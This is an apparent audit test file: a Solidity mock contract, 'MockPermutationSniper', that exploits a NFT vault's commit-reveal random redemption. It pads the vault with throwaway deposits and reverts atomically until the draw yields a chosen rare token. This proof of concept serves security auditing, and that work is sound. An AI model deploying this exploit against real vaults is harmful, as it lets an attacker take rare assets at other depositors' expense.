// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {MarketplankVault} from "../MarketplankVault.sol";

/**
 * AUDIT TEST-ONLY.
 *
 * The commit-reveal split freezes the SEED, but the drawn token is
 *     heldTokenIds[ keccak256(seed, msg.sender) % heldTokenIds.length ]
 * and BOTH the length and the contents of heldTokenIds remain freely mutable
 * by anyone after the commit. So the seed being unrerollable is irrelevant:
 * the attacker rerolls the *permutation* instead, atomically, and reverts the
 * whole attempt (for the price of gas) whenever the draw is not the rare one.
 */
contract MockPermutationSniper is IERC721Receiver {
    MarketplankVault public immutable vault;
    IERC721 public immutable nft;

    error NotTheRareOne(uint256 got);

    constructor(MarketplankVault vault_, IERC721 nft_) {
        vault = vault_;
        nft = nft_;
    }

    function approveAll() external {
        nft.setApprovalForAll(address(vault), true);
    }

    function deposit(uint256 tokenId) external {
        vault.deposit(tokenId);
    }

    function commit() external {
        vault.requestRandomRedeem();
    }

    /**
     * One atomic sniping attempt. Shifts heldTokenIds by depositing `padding`
     * throwaway NFTs, then claims. If the draw is not `rareTokenId` the whole
     * transaction reverts — deposits undone, shares restored, request still
     * pending, cost = gas. Try the next padding value.
     */
    function snipe(uint256[] calldata padding, uint256 rareTokenId) external {
        for (uint256 i = 0; i < padding.length; i++) {
            vault.deposit(padding[i]);
        }
        uint256 got = vault.claimRandomRedeem();
        if (got != rareTokenId) revert NotTheRareOne(got);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
